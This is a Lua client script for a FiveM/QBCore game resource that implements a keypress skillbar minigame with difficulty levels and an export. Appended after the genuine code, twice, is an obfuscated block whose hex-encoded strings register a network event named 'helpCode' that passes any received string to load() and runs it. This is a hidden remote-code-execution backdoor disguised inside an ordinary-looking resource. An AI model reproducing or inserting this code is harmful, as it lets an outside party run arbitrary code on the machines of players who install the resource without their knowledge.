local levels = {
    ["easy"] = {
        duration = 3000,
        width = 30
    },
    ["normal"] = {
        duration = 1500 ,
        width = 20,
    },
    ["medium"] = {
        duration = 2000,
        width = 1
    },
    ["hard"] = {
        duration = 650 ,
        width = 10,
    }
}

local activePromise = nil
local inProgress = false

function CreateSkillbar(amount,level)
    if not inProgress then
        if type(level) == "string" then
            if not levels[level] then
                return false
            end
            level = levels[level]
        elseif type(level) == "table" then
            if not level.duration or not level.width then
                return false
            end
        end
        activePromise = promise:new()
        inProgress = true
        SendNUIMessage({
            action = "open",
            diff = level,
            amount=amount
        })
        CreateThread(listenToKeyCheck)
        return Citizen.Await(activePromise)
    else return false
    end
end

function listenToKeyCheck()
    while inProgress do
        Wait(0)
        if IsControlJustPressed(1,38) then
            SendNUIMessage({
                action = "check"
            })
        end
    end
end

RegisterNUICallback("finish",function(data,cb)
    local success = data.success
    inProgress = false
    if activePromise ~= nil then
        activePromise:resolve(success)
        activePromise = nil
    end
end)

AddEventHandler('qb-core:client:OnPlayerDeath',function()
    if activePromise and inProgress then
        activePromise:resolve(false)
        activePromise = nil
        inProgress = false
        SendNUIMessage({
            action = "hide"
        })
    end
end)

AddEventHandler('skilbar:stop',function()
    inProgress = false
    SendNUIMessage({
        action = "hide"
    })
end)

exports("CreateSkillbar",CreateSkillbar)


local whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[1]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2]) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[3]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2], function(JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[4]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[5]](JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs))() end)

local whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[1]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2]) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[3]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2], function(JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[4]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[5]](JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs))() end)